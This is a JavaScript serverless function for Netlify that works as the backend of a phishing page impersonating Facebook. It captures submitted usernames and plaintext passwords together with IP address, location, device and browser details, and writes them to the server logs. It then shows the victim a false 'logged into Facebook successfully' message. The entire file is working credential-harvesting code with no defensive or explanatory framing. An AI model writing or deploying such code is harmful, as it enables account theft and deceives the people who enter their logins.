exports.handler = async (event, context) => {
  // Only accept POST requests
  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      headers: { "Content-Type": "text/html" },
      body: "<h1>405 - Method Not Allowed</h1>",
    };
  }

  // Parse form data
  const rawBody = event.body || "";
  const formData = {};
  rawBody.split("&").forEach((pair) => {
    const [key, value] = pair.split("=");
    formData[key] = decodeURIComponent(value || "");
  });

  // Extract user input
  const username = formData.username || "";
  const password = formData.password || "";

  // Get additional data from frontend
  const ipAddress = event.headers["x-forwarded-for"] || "Unknown IP";
  const userAgent = event.headers["user-agent"] || "Unknown User-Agent";
  const operatingSystem = formData.os || "Unknown OS";
  const deviceType = formData.device || "Unknown Device";
  const screenResolution = formData.resolution || "Unknown Resolution";
  const location = formData.location || "Unknown Location";
  const isp = formData.isp || "Unknown ISP";
  const referralURL = formData.referrer || "Unknown Referrer";
  const loginTimestamp = new Date().toISOString();

  // Log collected data (This will appear in Netlify logs)
  console.log("Login attempt:", {
    username,
    password,
    ipAddress,
    userAgent,
    operatingSystem,
    deviceType,
    screenResolution,
    location,
    isp,
    referralURL,
    loginTimestamp,
  });

  // Return an HTML success page
  return {
    statusCode: 200,
    headers: { "Content-Type": "text/html" },
    body: `
      <html>
        <head>
          <title>Login Successful</title>
          <style>
            body {
              font-family: Arial, sans-serif; 
              text-align: center; 
              margin-top: 20%;
            }
            h1 { color: green; }
          </style>
        </head>
        <body>
          <h1>You have logged into Facebook successfully</h1>
          <p>Your Facebook account is secure. You can now close this tab.</p>
        </body>
      </html>
    `,
  };
};
